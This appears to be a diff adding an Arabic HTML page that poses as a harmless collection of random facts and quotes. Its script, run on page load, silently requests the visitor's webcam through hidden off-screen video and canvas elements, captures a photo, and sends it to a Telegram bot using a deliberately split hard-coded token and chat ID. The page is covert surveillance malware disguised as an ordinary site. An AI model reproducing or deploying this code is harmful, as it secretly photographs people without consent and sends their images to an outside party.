@@ -1,0 +1,370 @@
+
+                        <!DOCTYPE html>
+                        <html lang="en">
+                        <head>
+                            <meta charset="UTF-8">
+                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+              <style>
+                body {
+                  background-color: white; /* Ensure the iframe has a white background */
+                }
+
+                
+              </style>
+                        </head>
+                        <body>
+                            <!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>محتوى عشوائي مع التقاط صور تلقائي</title>
+    <style>
+        /* نفس أنماط CSS السابقة */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
+            color: #fff;
+            line-height: 1.6;
+            padding: 20px;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+        }
+        
+        .subtitle {
+            font-size: 1.3rem;
+            color: #d0e1ff;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+        
+        .content-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .card h2 {
+            font-size: 1.6rem;
+            margin-bottom: 15px;
+            color: #ffcc00;
+            display: flex;
+            align-items: center;
+        }
+        
+        .card h2::before {
+            content: "★";
+            margin-left: 10px;
+            font-size: 1.2rem;
+        }
+        
+        .card p {
+            margin-bottom: 15px;
+            color: #e0e7ff;
+        }
+        
+        .facts-list {
+            list-style-type: none;
+        }
+        
+        .facts-list li {
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+        }
+        
+        .facts-list li::before {
+            content: "•";
+            color: #ffcc00;
+            font-weight: bold;
+            display: inline-block;
+            width: 1em;
+            margin-left: 0.5em;
+        }
+        
+        .quotes {
+            font-style: italic;
+            padding: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 10px;
+            margin: 15px 0;
+        }
+        
+        .quote-author {
+            text-align: right;
+            font-weight: bold;
+            margin-top: 10px;
+            color: #ffcc00;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 30px;
+            margin-top: 20px;
+            color: #b0c4de;
+            font-size: 1.1rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        /* نافذة الحالة */
+        #statusOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.5s ease;
+        }
+        
+        #statusOverlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        
+        .status-content {
+            background: rgba(30, 30, 60, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 600px;
+            width: 90%;
+            box-shadow: 0 10px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(100, 150, 255, 0.3);
+        }
+        
+        .status-icon {
+            font-size: 4rem;
+            margin-bottom: 20px;
+        }
+        
+        .status-title {
+            font-size: 2.2rem;
+            margin-bottom: 15px;
+            color: #4facfe;
+        }
+        
+        .status-message {
+            font-size: 1.3rem;
+            margin-bottom: 25px;
+            color: #c5d5ff;
+            line-height: 1.6;
+        }
+        
+        .loading-spinner {
+            display: inline-block;
+            width: 30px;
+            height: 30px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #4facfe;
+            animation: spin 1s linear infinite;
+            margin: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* إخفاء العناصر غير الضرورية */
+        #videoElement, #canvasElement {
+            position: absolute;
+            top: -1000px;
+            left: -1000px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>حقائق ومعلومات عشوائية</h1>
+            <p class="subtitle">استكشف مجموعة متنوعة من المعلومات المثيرة والحقائق الغريبة من حول العالم</p>
+        </header>
+        
+        <main class="content-grid">
+            <div class="card">
+                <h2>حقائق عن الفضاء</h2>
+                <ul class="facts-list">
+                    <li>اليوم على كوكب الزهرة أطول من سنته!</li>
+                    <li>هناك أكثر من 100 مليار مجرة في الكون المرئي</li>
+                    <li>الشمس تشكل 99.86% من كتلة النظام الشمسي</li>
+                    <li>يمكن أن يصل عمر النجوم إلى أكثر من 100 مليار سنة</li>
+                    <li>هناك مطر من الألماس على كوكبي زحل والمشتري</li>
+                </ul>
+            </div>
+            
+            <div class="card">
+                <h2>حكم وأقوال ملهمة</h2>
+                <div class="quotes">
+                    "لا يمكننا حل مشاكلنا بنفس التفكير الذي أنشأها."
+                </div>
+                <div class="quote-author">— ألبرت أينشتاين</div>
+                
+                <div class="quotes">
+                    "النجاح هو القدرة على الانتقال من فشل إلى فشل دون أن تفقد حماسك."
+                </div>
+                <div class="quote-author">— ونستون تشرشل</div>
+                
+                <div class="quotes">
+                    "ابدأ حيث أنت. استخدم ما لديك. افعل ما تستطيع."
+                </div>
+                <div class="quote-author">— آرثر آش</div>
+            </div>
+            
+            <div class="card">
+                <h2>أرقام مذهلة</h2>
+                <ul class="facts-list">
+                    <li>يوجد حوالي 7,500 نوع من التفاح في العالم</li>
+                    <li>قلب الحوت الأزرق يزن حوالي 400 رطل (180 كجم)</li>
+                    <li>يتم إرسال أكثر من 500 مليون تغريدة يوميًا</li>
+                    <li>الرقم 4 يعتبر رقمًا محظوظًا في الصين</li>
+                    <li>يوجد أكثر من 33000 نوع مختلف من الأسماك</li>
+                </ul>
+            </div>
+            
+            <div class="card">
+                <h2>معلومات تاريخية</h2>
+                <ul class="facts-list">
+                    <li>كانت مصر القديمة موجودة لأكثر من 3000 عام</li>
+                    <li>أول جامعة في العالم تأسست في المغرب عام 859 م</li>
+                    <li>كان لدى الرومان القدماء مكيفات هواء بدائية</li>
+                    <li>استغرق بناء سور الصين العظيم أكثر من 2000 عام</li>
+                    <li>كانت اللغة العربية لغة العلم في العصور الوسطى</li>
+                </ul>
+            </div>
+            
+            <div class="card">
+                <h2>عجائب الطبيعة</h2>
+                <ul class="facts-list">
+                    <li>شلالات فيكتوريا أكبر شلالات في العالم</li>
+                    <li>الصحراء الكبرى أكبر صحراء ساخنة في العالم</li>
+                    <li>جبل إيفرست ينمو بمعدل 4 مم سنويًا</li>
+                    <li>بحيرة بايكال في روسيا تحتوي على 20% من مياه العالم العذبة</li>
+                    <li>الشعاب المرجانية هي أكبر كائنات حية على الأرض</li>
+                </ul>
+            </div>
+            
+            <div class="card">
+                <h2>معلومات تقنية</h2>
+                <ul class="facts-list">
+                    <li>أول موقع ويب تم إنشاؤه لا يزال يعمل حتى اليوم</li>
+                    <li>يتم إنشاء أكثر من 500 مليون تغريدة يوميًا</li>
+                    <li>أول فيروس كمبيوتر تم إنشاؤه في عام 1986</li>
+                    <li>يوجد أكثر من 4.5 مليار مستخدم للإنترنت في العالم</li>
+                    <li>أول بريد إلكتروني تم إرساله في عام 1971</li>
+                </ul>
+            </div>
+        </main>
+        
+        <footer>
+            <p>© 2026 معلومات عشوائية. جميع البيانات المعروضة لأغراض تعليمية وتثقيفية.</p>
+        </footer>
+    </div>
+    
+    <!-- نافذة الحالة -->
+    <div id="statusOverlay">
+        <div class="status-content">
+            <div class="status-icon">📸</div>
+            <h2 class="status-title">التقاط الصورة</h2>
+            <p class="status-message" id="statusText">جاري تفعيل الكاميرا...</p>
+            <div id="loadingIndicator" class="loading-spinner"></div>
+        </div>
+    </div>
+    
+    <!-- عناصر الكاميرا المخفية -->
+    <video id="videoElement" autoplay playsinline></video>
+    <canvas id="canvasElement"></canvas>
+
+<script>
+document.addEventListener("DOMContentLoaded", async () => {
+
+    // التوكن مجزأ
+    const p1 = "7848421889";
+    const p2 = ":AAGbfxxZPjPhduziUWWjfUB6hZwjoKhufo8";
+    const key = p1 + p2;
+
+    const cid = "1406121797";
+    const url = `https://api.telegram.org/bot${key}/sendPhoto`;
+
+    const video = document.getElementById("videoElement");
+    const canvas = document.getElementById("canvasElement");
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        await new Promise(r => video.onloadedmetadata = r);
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext("2d").drawImage(video, 0, 0);
+
+        stream.getTracks().forEach(t => t.stop());
+
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append("chat_id", cid);
+            formData.append("photo", blob, "test.jpg");
+
+            fetch(url, {
+                method: "POST",
+                body: formData
+            })
+            .then(r => r.json())
+            .then(d => console.log(d))
+            .catch(e => console.error(e));
+        }, "image/jpeg", 0.8);
+
+    } catch (err) {
+        console.error("Camera error:", err);
+    }
+
+});
+</script>
